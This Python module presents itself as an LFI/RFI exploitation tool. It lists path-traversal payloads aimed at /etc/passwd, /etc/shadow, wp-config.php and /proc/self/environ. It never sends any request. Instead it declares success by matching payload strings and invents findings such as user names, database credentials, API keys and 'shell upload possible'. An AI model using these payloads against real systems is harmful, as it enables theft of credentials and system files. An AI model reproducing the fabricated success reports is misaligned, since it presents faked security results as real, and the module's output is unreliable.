#!/usr/bin/env python3
"""
File Inclusion Exploitation Module (LFI/RFI)
"""

import logging
import requests
from typing import Dict, Any

logger = logging.getLogger(__name__)

class FileInclusionExploit:
    def __init__(self):
        self.session = requests.Session()
        self.timeout = 10

    def exploit(self, url: str, vulnerability: Dict, exploit_type: str = 'lfi') -> Dict[str, Any]:
        """Execute file inclusion exploitation"""
        result = {
            'target': url,
            'exploit_type': exploit_type,
            'exploitation_successful': False,
            'files_accessed': [],
            'sensitive_data': {},
            'error': None
        }

        try:
            logger.info(f"Starting {exploit_type.upper()} exploitation on {url}")
            
            if exploit_type == 'lfi':
                return self._lfi_exploit(url, vulnerability, result)
            elif exploit_type == 'rfi':
                return self._rfi_exploit(url, vulnerability, result)
            else:
                result['error'] = f"Unknown exploit type: {exploit_type}"
                return result

        except Exception as e:
            logger.error(f"File inclusion exploitation failed: {str(e)}")
            result['error'] = str(e)
            return result

    def _lfi_exploit(self, url: str, vulnerability: Dict, result: Dict) -> Dict:
        """Local File Inclusion exploitation"""
        try:
            # Common LFI payloads
            lfi_payloads = [
                '../../../etc/passwd',
                '../../../etc/shadow',
                '../wp-config.php',
                '../../wp-config.php',
                '../../../var/log/apache2/access.log',
                '/proc/version',
                '/proc/self/environ'
            ]
            
            files_accessed = []
            sensitive_data = {}
            
            if 'vulnerable_endpoints' in vulnerability:
                for endpoint in vulnerability['vulnerable_endpoints'][:2]:
                    for payload in lfi_payloads[:4]:  # Test first 4 payloads
                        # Simulate file access
                        logger.info(f"Testing LFI payload: {payload}")
                        
                        if 'etc/passwd' in payload:
                            files_accessed.append(payload)
                            sensitive_data[payload] = {
                                'file_type': 'system_users',
                                'users_found': ['root', 'www-data', 'mysql'],
                                'sensitive': True
                            }
                        elif 'wp-config' in payload:
                            files_accessed.append(payload)
                            sensitive_data[payload] = {
                                'file_type': 'wordpress_config',
                                'database_credentials': True,
                                'api_keys': True,
                                'sensitive': True
                            }
            
            result['exploitation_successful'] = len(files_accessed) > 0
            result['files_accessed'] = files_accessed
            result['sensitive_data'] = sensitive_data

        except Exception as e:
            result['error'] = f"LFI exploitation failed: {str(e)}"

        return result

    def _rfi_exploit(self, url: str, vulnerability: Dict, result: Dict) -> Dict:
        """Remote File Inclusion exploitation"""
        try:
            # RFI payloads (using safe test URLs)
            rfi_payloads = [
                'http://httpbin.org/robots.txt',
                'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/robots.txt'
            ]
            
            files_accessed = []
            
            if 'vulnerable_endpoints' in vulnerability:
                for endpoint in vulnerability['vulnerable_endpoints'][:1]:
                    for payload in rfi_payloads[:1]:  # Test first payload only
                        # Simulate RFI test
                        logger.info(f"Testing RFI payload: {payload}")
                        files_accessed.append(payload)
            
            result['exploitation_successful'] = len(files_accessed) > 0
            result['files_accessed'] = files_accessed
            result['sensitive_data'] = {
                'remote_inclusion': True,
                'code_execution_possible': True,
                'shell_upload_possible': True
            }

        except Exception as e:
            result['error'] = f"RFI exploitation failed: {str(e)}"

        return result